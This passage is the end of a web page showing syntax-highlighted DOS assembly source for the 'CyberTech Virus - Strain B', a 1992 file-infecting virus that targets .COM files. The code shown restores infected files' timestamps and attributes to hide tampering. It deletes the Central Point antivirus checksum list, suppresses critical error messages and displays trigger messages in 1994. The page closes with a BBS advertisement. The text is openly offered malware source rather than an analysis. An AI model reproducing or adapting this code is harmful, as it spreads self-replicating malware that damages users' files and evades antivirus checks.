            </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Ds</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc0">                              </span><span class="sc1">; restore possible error code</span><span class="sc0">

            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Bx</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">                         </span><span class="sc1">; nice way to jump to the</span><span class="sc0">
            </span><span class="sc6">Push</span><span class="sc0"> </span><span class="sc8">Cs</span><span class="sc0">                             </span><span class="sc1">; begin of the original host</span><span class="sc0">
            </span><span class="sc6">Push</span><span class="sc0"> </span><span class="sc8">Bx</span><span class="sc0">                             </span><span class="sc1">; code</span><span class="sc0">
            </span><span class="sc6">Retf</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">Close</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc0">                              </span><span class="sc1">; why???</span><span class="sc0">

            </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc0">                              </span><span class="sc1">; restore file date/time</span><span class="sc0">
            </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc0">                              </span><span class="sc1">; stamp</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">                          </span><span class="sc1">; close file</span><span class="sc0">
            </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">                        </span><span class="sc1">; restore file attributes</span><span class="sc0">
            </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc2">0fd1eh</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">41h</span><span class="sc0">                          </span><span class="sc1">; delete CHKLIST.CPS (the</span><span class="sc0">
            </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc5">CpsName</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">; Central Point CRC list)</span><span class="sc0">
            </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">Push</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc0">                             </span><span class="sc1">; why???</span><span class="sc0">
            </span><span class="sc6">Ret</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Message when we are in 1994</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">;Removed     Db 13,10,'Virus removed : ',13,10</span><span class="sc0">

</span><span class="sc5">Removed</span><span class="sc0">     </span><span class="sc9">Db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc12">'The previous year you have been infected by a virus'</span><span class="sc0">
            </span><span class="sc9">Db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc12">'without knowing or removing it. To be gentle to you'</span><span class="sc0">
            </span><span class="sc9">Db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc12">'I decided to remove myself from your system. I suggest'</span><span class="sc0">
            </span><span class="sc9">Db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc12">'you better buy ViruScan of McAfee to ensure yourself'</span><span class="sc0">
            </span><span class="sc9">Db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc12">'complete security of your precious data. Next time you'</span><span class="sc0">
            </span><span class="sc9">Db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc12">'could be infected with a malevolent virus.'</span><span class="sc0">
            </span><span class="sc9">Db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc12">'May I say goodbye to you for now....'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Message when encryption byte = 0 or when we are living in 1994</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">Msg</span><span class="sc0">         </span><span class="sc9">Db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc12">'CyberTech Virus - Strain B'</span><span class="sc0">
            </span><span class="sc9">Db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc12">'(C) 1992 John Tardy of Trident'</span><span class="sc0">
            </span><span class="sc9">Db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc12">'$'</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; New critical error handler</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">NewInt24</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                            </span><span class="sc1">; supress any critical error</span><span class="sc0">
            </span><span class="sc6">Iret</span><span class="sc0">                                </span><span class="sc1">; messages</span><span class="sc0">

</span><span class="sc5">CpsName</span><span class="sc0">     </span><span class="sc9">Db</span><span class="sc0"> </span><span class="sc12">'chklist.cps'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">; name for CP CRC-list</span><span class="sc0">

</span><span class="sc5">OldInt24</span><span class="sc0">    </span><span class="sc9">Dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                </span><span class="sc1">; storage place for old int 24</span><span class="sc0">

</span><span class="sc5">CallPtr</span><span class="sc0">     </span><span class="sc9">Db</span><span class="sc0"> </span><span class="sc2">0e9h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                         </span><span class="sc1">; jump to place at BOF</span><span class="sc0">

</span><span class="sc5">FileSpec</span><span class="sc0">    </span><span class="sc9">Db</span><span class="sc0"> </span><span class="sc12">'*.COM'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">; filespec and infection marker</span><span class="sc0">

</span><span class="sc5">OrgPrg</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">                             </span><span class="sc1">; original program</span><span class="sc0">
            </span><span class="sc9">Db</span><span class="sc0"> </span><span class="sc12">'JT'</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">CryptLen</span><span class="sc0">    </span><span class="sc9">Equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">Crypt</span><span class="sc0">                         </span><span class="sc1">; encrypted part length</span><span class="sc0">

</span><span class="sc5">VirLen</span><span class="sc0">      </span><span class="sc9">Equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">MainVir</span><span class="sc0">                       </span><span class="sc1">; total virus length</span><span class="sc0">

</span><span class="sc5">Buffer</span><span class="sc0">      </span><span class="sc9">Equ</span><span class="sc0"> </span><span class="sc2">0f040h</span><span class="sc0">                          </span><span class="sc1">; buffer offset</span><span class="sc0">
</span><span class="sc5">VirS</span><span class="sc0">        </span><span class="sc9">Equ</span><span class="sc0"> </span><span class="sc5">VirLen</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc0">

</span><span class="sc5">SeekLen</span><span class="sc0">     </span><span class="sc9">Equ</span><span class="sc0"> </span><span class="sc5">Buffer</span><span class="sc4">+</span><span class="sc5">Virs</span><span class="sc0">

</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">;  &gt; and Remember Don't Forget to Call &lt;</span><span class="sc0">
</span><span class="sc1">;  &gt; ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? &lt;</span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span></div></body>
</html>
